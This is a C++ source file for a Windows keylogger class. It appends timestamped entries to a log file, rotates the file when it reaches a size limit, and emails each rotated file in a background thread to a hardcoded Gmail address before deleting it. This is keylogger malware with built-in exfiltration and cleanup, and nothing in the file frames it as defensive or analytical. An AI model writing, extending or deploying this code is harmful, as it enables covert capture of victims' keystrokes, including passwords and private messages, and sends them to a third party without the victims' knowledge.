#include "KeyboardLogger.h"



KeyboardLogger::KeyboardLogger(long long maxLength, string emailReceiver)
{
	this->maxLength = maxLength;
	this->currentLength = 0;
	this->emailReceiver = emailReceiver;
	hFile = CreateFile(FILE_NAME,
		GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		hFile = CreateFile(FILE_NAME,
			GENERIC_WRITE,
			0,
			NULL,
			CREATE_NEW,
			FILE_ATTRIBUTE_NORMAL,
			NULL);
	}
	else
	{
		SetFilePointer(hFile, 0, NULL, FILE_END);
	}
	
}


KeyboardLogger::~KeyboardLogger()
{
	CloseHandle(hFile);
}

void KeyboardLogger::addMessage(string mes)
{
	string stringToWrite;
	string currentTime = this->getCurrentTime();
	stringToWrite.append(currentTime);
	stringToWrite.append(": ");
	stringToWrite.append(mes);
	stringToWrite.append("\r\n");
	currentLength++;
	if (currentLength > maxLength)
	{
		CloseHandle(hFile);
		wstring newName = this->renameCurrentFile();
		wstring *name = new wstring(newName);
		DWORD id;
		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&sendFileNewThread, (LPVOID) name, NULL, &id);
		hFile = CreateFile(FILE_NAME,
			GENERIC_WRITE,
			0,
			NULL,
			CREATE_NEW,
			FILE_ATTRIBUTE_NORMAL,
			NULL);
		currentLength = 0;
	}
	DWORD written;
	WriteFile(
		hFile,          
		stringToWrite.c_str(),
		stringToWrite.size(),
		&written,
		NULL);
	return;
}

void KeyboardLogger::clearFile(wstring fileName)
{
	ofstream file(fileName, ios_base::out | ios_base::trunc);
	file.close();
	return;
}

void KeyboardLogger::sendFile(wstring fileName)
{
	Email email(this->emailReceiver);
	email.send(fileName);
	return;
}

string KeyboardLogger::getCurrentTime()
{
	auto end = std::chrono::system_clock::now();
	time_t currentTime = std::chrono::system_clock::to_time_t(end);
	string time = ctime(&currentTime);
	time.resize(time.size() - 1);
	return time;
}

wstring KeyboardLogger::renameCurrentFile()
{
	int num = 0;
	wstring name(FILE_NAME);
	wstring newName;
	ifstream infile;
	do
	{
		newName = name;
		newName.resize(newName.size() - 4);
		newName.append(to_wstring(num));
		newName.append(L".txt");
		infile.open(newName);
		num++;
	} while (infile.good());
	MoveFile(FILE_NAME, newName.c_str());
	return newName;
}

void KeyboardLogger::sendFileNewThread(LPVOID arg)
{
	wstring *fileName = (wstring *)arg;
	Email email("hAzy142@gmail.com");
	email.send(*fileName);
	DeleteFile(fileName->c_str());
	delete fileName;
}